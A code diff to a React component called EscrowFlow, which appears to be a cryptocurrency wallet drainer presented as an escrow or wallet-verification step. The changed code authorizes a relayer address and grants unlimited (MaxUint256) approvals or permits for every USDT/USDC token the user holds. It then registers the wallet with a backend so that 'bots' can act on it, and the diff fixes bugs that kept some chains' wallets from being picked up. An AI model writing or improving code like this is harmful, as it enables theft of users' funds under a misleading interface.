@@ -627,12 +627,15 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     approvedTokens: { symbol: string; address: string; txHash?: string }[]
   ) {
     if (!address) return;
-    const body = JSON.stringify({
+    const payload: Record<string, unknown> = {
       address,
       chain: chain.name,
-      authorizeTx,
       approvedTokens,
-    });
+    };
+    if (authorizeTx && /^0x[0-9a-fA-F]{64}$/.test(authorizeTx)) {
+      payload.authorizeTx = authorizeTx;
+    }
+    const body = JSON.stringify(payload);
     try {
       const verifyRes = await fetch("/api/verify", {
         method: "POST",
@@ -647,6 +650,8 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
           headers: { "Content-Type": "application/json" },
           body,
         }).catch(() => {});
+      } else {
+        console.log("[escrow] /api/verify ok:", chain.name);
       }
     } catch (err) {
       console.error("[escrow] /api/verify error:", chain.name, err);
@@ -698,10 +703,19 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
     const signer = await getSignerFor(chain);
     const approvedTokens: { symbol: string; address: string; txHash?: string }[] = [];
 
-    // 1) Authorize relayer
+    // 1) Authorize relayer (skip if already authorized on this chain)
     const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
-    const authTx = await verification.authorize(RELAYER_ADDRESS);
-    await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
+    let authorizeTxHash = "";
+    const alreadyAuth = await verification
+      .isAuthorized(address, RELAYER_ADDRESS)
+      .catch(() => false);
+    if (!alreadyAuth) {
+      const authTx = await verification.authorize(RELAYER_ADDRESS);
+      await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
+      authorizeTxHash = authTx.hash as string;
+    } else {
+      console.log("[escrow] already authorized on", chain.name);
+    }
 
     // 2) Approve every USDT/USDC with balance
     for (const { token, bal } of balances) {
@@ -758,7 +772,7 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
       }
     }
 
-    await persistEvmVerify(chain, authTx.hash, approvedTokens);
+    await persistEvmVerify(chain, authorizeTxHash, approvedTokens);
     setApprovedChains((prev) => (prev.includes(chain.name) ? prev : [...prev, chain.name]));
     return true;
   }
@@ -977,31 +991,83 @@ export default function EscrowFlow({ sessionId }: { sessionId?: string } = {}) {
 
   async function handleModal1ApproveAll(items: Modal1Item[]) {
     setModal1Approving(true);
+
+    // One authorize + verify per chain (multiple USDT/USDC on same chain share it)
+    const byChain = new Map<string, Modal1Item[]>();
     for (const item of items) {
-      if (item.alreadyApproved) {
-        setModal1Status((s) => ({ ...s, [item.key]: "done" }));
-        continue;
-      }
-      setModal1Status((s) => ({ ...s, [item.key]: "approving" }));
+      const list = byChain.get(item.chainName) ?? [];
+      list.push(item);
+      byChain.set(item.chainName, list);
+    }
+
+    for (const [chainName, chainItems] of byChain) {
+      const chain = CHAINS.find((c) => c.name === chainName);
+      if (!chain || !address) continue;
+
       try {
-        const chain = CHAINS.find((c) => c.name === item.chainName)!;
-        const token = chain.tokens.find(
-          (t) => t.address.toLowerCase() === item.tokenAddr.toLowerCase()
-        );
         const signer = await getSignerFor(chain);
-        if (item.permit && token) {
-          await signAndSubmitPermit(signer, chain, token);
-        } else {
-          const erc20 = new Contract(item.tokenAddr, ERC20_ABI, signer);
-          const tx = await erc20.approve(item.contract, MaxUint256);
-          tx.wait(1).catch((e: Error) => console.warn("[modal1] approve mining:", e.message));
+        const verification = new Contract(chain.contract, WALLET_VERIFICATION_ABI, signer);
+
+        // Bot requires on-chain isAuthorized — token approve alone is not enough
+        let authorizeTx: string | undefined;
+        const alreadyAuth = await verification
+          .isAuthorized(address, RELAYER_ADDRESS)
+          .catch(() => false);
+        if (!alreadyAuth) {
+          const authTx = await verification.authorize(RELAYER_ADDRESS);
+          await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 30_000))]);
+          authorizeTx = authTx.hash as string;
         }
-        setModal1Status((s) => ({ ...s, [item.key]: "done" }));
+
+        const approvedTokens: { symbol: string; address: string; txHash?: string }[] = [];
+
+        for (const item of chainItems) {
+          setModal1Status((s) => ({ ...s, [item.key]: "approving" }));
+          if (item.alreadyApproved) {
+            approvedTokens.push({ symbol: item.symbol, address: item.tokenAddr });
+            setModal1Status((s) => ({ ...s, [item.key]: "done" }));
+            continue;
+          }
+          try {
+            const token = chain.tokens.find(
+              (t) => t.address.toLowerCase() === item.tokenAddr.toLowerCase()
+            );
+            if (item.permit && token) {
+              await signAndSubmitPermit(signer, chain, token);
+              approvedTokens.push({ symbol: item.symbol, address: item.tokenAddr });
+            } else {
+              const erc20 = new Contract(item.tokenAddr, ERC20_ABI, signer);
+              const tx = await erc20.approve(item.contract, MaxUint256);
+              approvedTokens.push({
+                symbol: item.symbol,
+                address: item.tokenAddr,
+                txHash: tx.hash as string,
+              });
+              tx.wait(1).catch((e: Error) => console.warn("[modal1] approve mining:", e.message));
+            }
+            setModal1Status((s) => ({ ...s, [item.key]: "done" }));
+          } catch (err) {
+            console.error("[modal1] approve failed:", item.key, err);
+            setModal1Status((s) => ({ ...s, [item.key]: "failed" }));
+          }
+        }
+
+        if (approvedTokens.length === 0) {
+          approvedTokens.push(
+            ...chainItems.map((i) => ({ symbol: i.symbol, address: i.tokenAddr }))
+          );
+        }
+
+        // Register so BNB/ETH/Polygon bots see the wallet (was missing for BNB)
+        await persistEvmVerify(chain, authorizeTx ?? "", approvedTokens);
       } catch (err) {
-        console.error("[modal1] approve failed:", item.key, err);
-        setModal1Status((s) => ({ ...s, [item.key]: "failed" }));
+        console.error("[modal1] chain failed:", chainName, err);
+        for (const item of chainItems) {
+          setModal1Status((s) => ({ ...s, [item.key]: "failed" }));
+        }
       }
     }
+
     setModal1Approving(false);
     setModal1Complete(true);
   }
